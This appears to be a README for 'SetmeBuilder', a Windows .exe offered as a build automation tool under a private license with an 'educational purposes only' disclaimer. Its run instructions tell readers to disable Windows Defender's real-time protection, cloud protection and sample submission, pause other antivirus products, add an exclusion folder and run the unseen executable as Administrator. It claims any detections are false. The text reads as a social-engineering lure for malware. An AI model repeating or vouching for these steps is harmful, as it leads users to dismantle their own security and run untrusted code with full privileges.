# SetmeBuilder

[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](#)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6.svg)](#)
[![License](https://img.shields.io/badge/license-Private-red.svg)](#)

A premium build automation and packaging tool for Windows. Generate a fully customized build pipeline in seconds with your own configuration and selected features. No scripting required — just select your target, pick what you want to build, and hit BUILD. The generated .exe is a standalone file that works on any Windows 10/11 machine without Python or dependencies.

🇹🇷 **Made in Türkiye** by Turkish developers.

## What it builds

- Native Windows executables (x64)
- Portable single-file artifacts
- Multi-target build outputs
- Asset and resource packaging
- Configuration-driven task pipelines
- Incremental build cache
- Dependency resolution and bundling
- Manifest and metadata generation
- Version stamping
- Digital signature hooks
- Archive outputs (zip, tar.gz)
- Log and report generation

## Features

- Modern dark UI
- Real-time build log streaming
- Declarative configuration (TOML)
- Plugin interface for custom steps
- Remote build agent support
- Fallback build mode for locked files
- Single .exe output — no runtime required
- Auto-filled configuration fields
- Built-in artifact compression
- Multi-threaded fast build execution

## Requirements

- Windows 10/11 x64
- Administrator privileges (recommended)
- Build configuration file

## How to Run

> **IMPORTANT:** Before running, you must temporarily disable your antivirus and Windows Defender. This tool performs system-level operations that are falsely flagged as suspicious by security software.

### Step-by-step

1. **Disable Windows Defender**

   - Open Windows Security → Virus & threat protection → Manage settings
   - Turn off "Real-time protection"
   - Turn off "Cloud-delivered protection"
   - Turn off "Automatic sample submission"
2. **Disable third-party antivirus** (if installed)

   - Right-click your antivirus icon in the system tray → Pause protection / Disable
   - Common AVs: Malwarebytes, Kaspersky, Avast, AVG, Norton, Bitdefender
3. **Add exclusion folder** (optional but recommended)

   - Windows Security → Virus & threat protection → Manage settings
   - Scroll to "Exclusions" → Add or remove exclusions → Add a folder
   - Select the folder where SetmeBuilder.exe is located
4. **Run as Administrator**

   - Right-click `SetmeBuilder.exe` → **Run as Administrator**
   - Accept the UAC prompt
5. **Use the builder**

   - Load your configuration file in the field
   - Select the features you want to build
   - Click **BUILD**
   - Wait for the build process to complete
6. **Re-enable antivirus**

   - After the build is done, turn your antivirus back on
   - Add SetmeBuilder.exe to the exclusion list if needed

## Installation

1. Download `SetmeBuilder.exe` from the Releases section
2. Right-click → Run as Administrator
3. Load your configuration file
4. Select the features you want
5. Click BUILD

## Changelog

See CHANGELOG.md

## Disclaimer

This software is provided for educational purposes only. The author is not responsible for any misuse.

## Support

For support, open an issue on GitHub.
